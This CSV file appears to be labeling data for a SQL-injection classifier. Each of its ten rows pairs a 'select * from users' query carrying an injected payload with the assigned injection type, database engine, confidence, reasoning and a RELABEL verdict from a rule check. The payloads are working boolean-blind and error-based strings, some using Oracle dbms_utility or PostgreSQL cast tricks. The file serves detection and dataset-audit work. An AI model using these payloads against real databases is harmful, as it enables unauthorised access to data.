payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"select * from users WHERE username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'"" and username = ""1",error_based,oracle,0.9,Oracle with PostgreSQL cast,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39800,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'"" and username = ""1"
"select * from users WHERE username = ""1"" and ( ( ( 6395 = 6395"" or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",error_based,oracle,0.9,Oracle dbms_utility error function,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,39801,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"select * from users WHERE username = ""1"" and ( ( ( 6395 = 6395"" or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"""
"select * from users WHERE username = ""1\' ) or username = ""-1254"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1""",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39802,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1\' ) or username = ""-1254"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1"""
"select * from users WHERE username = ""-6079 ) ) ) and ( ( ( 8708 = 8708"" and username = ""-5863""",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39803,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-6079 ) ) ) and ( ( ( 8708 = 8708"" and username = ""-5863"""
"select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" or username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo""",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39804,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" or username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"""
"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-1254"" and username = ""-7874 ) ) )",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39805,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-1254"" and username = ""-7874 ) ) )"
"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6353%\' ) )",error_based,postgresql,0.9,PostgreSQL cast for injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39806,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6353%\' ) )"
"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1254"" and username = ""1",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39807,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1254"" and username = ""1"
"select * from users WHERE username = ""-1190\' or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-9564",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39808,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""-1190\' or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-9564"
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254"" and username = ""1%\' ) )",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,39809,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254"" and username = ""1%\' ) )"
